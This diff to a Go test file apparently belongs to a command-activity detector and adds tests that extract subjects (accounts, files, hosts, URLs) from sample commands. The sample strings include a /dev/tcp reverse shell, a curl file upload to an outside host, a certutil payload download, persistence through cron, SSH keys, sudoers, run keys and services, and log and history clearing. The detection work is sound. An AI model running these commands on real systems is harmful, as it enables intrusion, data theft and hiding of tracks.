@@ -4,6 +4,7 @@ import (
 	"slices"
 	"strings"
 	"testing"
+	"unicode/utf8"
 )
 
 func names(hits []Hit) []string {
@@ -432,22 +433,26 @@ func TestDecodeRejects(t *testing.T) {
 		t.Fatalf("a table of paths only: %v", err)
 	}
 	tests := map[string]string{
-		"not json":           `{`,
-		"no activities":      `{"contexts":{},"activities":[]}`,
-		"trailing data":      one(`"patterns":["a"]`) + ` x`,
-		"unknown field":      one(`"patterns":["a"],"extra":1`),
-		"empty name":         `{"activities":[{"name":"","tactics":["T"],"attack":["X"],"patterns":["a"]}]}`,
-		"named twice":        `{"activities":[{"name":"A","tactics":["T"],"attack":["X"],"patterns":["a"]},{"name":"A","tactics":["T"],"attack":["X"],"patterns":["b"]}]}`,
-		"no tactics":         `{"activities":[{"name":"A","tactics":[],"patterns":["a"]}]}`,
-		"no technique":       `{"activities":[{"name":"A","tactics":["T"],"patterns":["a"]}]}`,
-		"no patterns":        one(`"patterns":[]`),
-		"bad pattern":        one(`"patterns":["("]`),
-		"bad path":           one(`"context":"c","paths":["("]`),
-		"bad unless":         one(`"patterns":["a"],"unless":"("`),
-		"bad context":        `{"contexts":{"c":"("},"activities":[{"name":"A","tactics":["T"],"attack":["X"],"patterns":["a"]}]}`,
-		"paths, no context":  one(`"paths":["a"]`),
-		"context, no paths":  one(`"patterns":["a"],"context":"c"`),
-		"an unknown context": one(`"context":"d","paths":["a"]`),
+		"not json":                        `{`,
+		"no activities":                   `{"contexts":{},"activities":[]}`,
+		"trailing data":                   one(`"patterns":["a"]`) + ` x`,
+		"unknown field":                   one(`"patterns":["a"],"extra":1`),
+		"empty name":                      `{"activities":[{"name":"","tactics":["T"],"attack":["X"],"patterns":["a"]}]}`,
+		"named twice":                     `{"activities":[{"name":"A","tactics":["T"],"attack":["X"],"patterns":["a"]},{"name":"A","tactics":["T"],"attack":["X"],"patterns":["b"]}]}`,
+		"no tactics":                      `{"activities":[{"name":"A","tactics":[],"patterns":["a"]}]}`,
+		"no technique":                    `{"activities":[{"name":"A","tactics":["T"],"patterns":["a"]}]}`,
+		"no patterns":                     one(`"patterns":[]`),
+		"bad pattern":                     one(`"patterns":["("]`),
+		"bad path":                        one(`"context":"c","paths":["("]`),
+		"bad unless":                      one(`"patterns":["a"],"unless":"("`),
+		"bad context":                     `{"contexts":{"c":"("},"activities":[{"name":"A","tactics":["T"],"attack":["X"],"patterns":["a"]}]}`,
+		"paths, no context":               one(`"paths":["a"]`),
+		"context, no paths":               one(`"patterns":["a"],"context":"c"`),
+		"an unknown context":              one(`"context":"d","paths":["a"]`),
+		"a subject without a label":       one(`"patterns":["a"],"subjects":[{"pattern":"(a)"}]`),
+		"a subject without a group":       one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"a"}]`),
+		"a subject with two groups":       one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"(a)(b)"}]`),
+		"a subject that does not compile": one(`"patterns":["a"],"subjects":[{"label":"l","pattern":"("}]`),
 	}
 	for name, data := range tests {
 		t.Run(name, func(t *testing.T) {
@@ -605,5 +610,89 @@ func TestDetectWithoutLiterals(t *testing.T) {
 	}
 	if hits := table.Detect("release 1.2.3 on 2026-10\n"); len(hits) != 1 {
 		t.Errorf("hits = %+v, want Versioned alone outside the context", hits)
+	}
+}
+
+// subjectsOf gives the subjects of the first evidence line of the named activity.
+func subjectsOf(hits []Hit, name string) []Subject {
+	for _, h := range hits {
+		if h.Name == name && len(h.Evidence) > 0 {
+			return h.Evidence[0].Subjects
+		}
+	}
+	return nil
+}
+
+// An activity says what it acted on: the account, the file, the host.
+func TestDetectSubjects(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	tests := []struct {
+		activity string
+		text     string
+		want     []Subject
+	}{
+		{"AccountCreation", `useradd -m -s /bin/bash svc`, []Subject{{"account", "svc"}}},
+		{"AccountCreation", `net user helper "$P" /add`, []Subject{{"account", "helper"}}},
+		{"AccountCreation", `New-LocalUser -Name "helper" -NoPassword`, []Subject{{"account", "helper"}}},
+		{"SystemdUnitCreation", `systemctl enable --now sync.service`, []Subject{{"unit", "sync.service"}}},
+		{"ScheduledJobCreation", `echo "$JOB" >> /etc/cron.d/sync`, []Subject{{"job file", "/etc/cron.d/sync"}}},
+		{"ScheduledJobCreation", "JOB='* * * * * /tmp/t'\n(crontab -l; echo \"$JOB\") | crontab -", []Subject{{"runs", "* * * * * /tmp/t ($JOB)"}}},
+		{"SshKeyPersistence", `echo "$KEY" >> ~/.ssh/authorized_keys`, []Subject{{"file", "~/.ssh/authorized_keys"}}},
+		{"SudoersModification", `echo "$RULE" >> /etc/sudoers.d/svc`, []Subject{{"file", "/etc/sudoers.d/svc"}}},
+		{"SetuidBit", "F=/tmp/tool\nchmod u+s \"$F\"", []Subject{{"file", "/tmp/tool ($F)"}}},
+		{"LogDeletion", `rm -f /var/log/auth.log`, []Subject{{"log", "/var/log/auth.log"}}},
+		{"SecurityToolDisabling", `systemctl stop auditd`, []Subject{{"service", "auditd"}}},
+		{"ReverseShell", "H=203.0.113.41\nexec 3<>/dev/tcp/$H/$PORT", []Subject{{"host", "203.0.113.41 ($H)"}}},
+		{"FileUpload", `curl -T out.tgz https://files.example.net/up`, []Subject{{"url", "https://files.example.net/up"}, {"file", "out.tgz"}}},
+		{"FileDownload", `certutil -urlcache -f http://203.0.113.10/c.exe %TEMP%\c.exe`, []Subject{{"url", "http://203.0.113.10/c.exe"}}},
+		{"ScheduledTaskCreation", `schtasks /create /tn Updater /tr "rundll32.exe C:\a.dll,Start" /sc onlogon`, []Subject{{"task", "Updater"}, {"runs", `rundll32.exe C:\a.dll,Start`}}},
+		{"RunKeyPersistence", `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d "c:\a.exe"`, []Subject{{"value", "Updater"}, {"runs", `c:\a.exe`}}},
+		{"ServiceCreation", `sc.exe \\dc01 create Upd binPath= c:\a.exe`, []Subject{{"service", "Upd"}, {"runs", `c:\a.exe`}, {"host", "dc01"}}},
+		{"EventLogClearing", `wevtutil cl Security`, []Subject{{"log", "Security"}}},
+		{"KeyVaultSecretRead", `curl -s "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4"`, []Subject{{"vault", "corpvault"}, {"secret", "db-password"}}},
+		{"TokenRequest", "$TENANT = '11111111-2222-4333-8444-555555555555'\naz login --service-principal -u app1 -p $S --tenant $TENANT", []Subject{{"tenant", "11111111-2222-4333-8444-555555555555 ($TENANT)"}, {"client", "app1"}}},
+		{"HistoryClearing", `history -c`, nil},
+	}
+	for _, tt := range tests {
+		t.Run(tt.text, func(t *testing.T) {
+			if got := subjectsOf(table.Detect(tt.text), tt.activity); !slices.Equal(got, tt.want) {
+				t.Errorf("subjects of %s = %v, want %v", tt.activity, got, tt.want)
+			}
+		})
+	}
+}
+
+// Evidence names the line as it stands in the file, even after a command
+// that is continued over lines, and keeps a bounded number of bounded lines.
+func TestDetectEvidence(t *testing.T) {
+	table, err := LoadActivities()
+	if err != nil {
+		t.Fatal(err)
+	}
+	text := "#!/bin/bash\ncurl -s \\\n  -T out.tgz \\\n  https://files.example.net/up\n\n   history   -c  \n"
+	hits := table.Detect(text)
+	if got := names(hits); !slices.Equal(got, []string{"FileUpload", "HistoryClearing"}) {
+		t.Fatalf("activities = %q", got)
+	}
+	if e := hits[0].Evidence; len(e) != 1 || e[0].Line != 2 || e[0].Text != "curl -s -T out.tgz https://files.example.net/up" {
+		t.Errorf("a continued command: evidence = %+v, want line 2 joined and trimmed", e)
+	}
+	if e := hits[1].Evidence; len(e) != 1 || e[0].Line != 6 || e[0].Text != "history -c" {
+		t.Errorf("a line after a continued command: evidence = %+v, want line 6", e)
+	}
+	var many strings.Builder
+	for range maxEvidence + 5 {
+		many.WriteString("history -c # " + strings.Repeat("é", maxText) + "\n")
+	}
+	hits = table.Detect(many.String())
+	if len(hits) != 1 || hits[0].Lines != maxEvidence+5 || len(hits[0].Evidence) != maxEvidence {
+		t.Fatalf("many lines: %d lines counted and %d kept, want %d and %d", hits[0].Lines, len(hits[0].Evidence), maxEvidence+5, maxEvidence)
+	}
+	last := hits[0].Evidence[maxEvidence-1]
+	if last.Line != maxEvidence || len(last.Text) > maxText || !strings.HasSuffix(last.Text, ellipsis) || !utf8.ValidString(last.Text) {
+		t.Errorf("a long line: line %d, %d bytes, %q", last.Line, len(last.Text), last.Text[len(last.Text)-8:])
 	}
 }
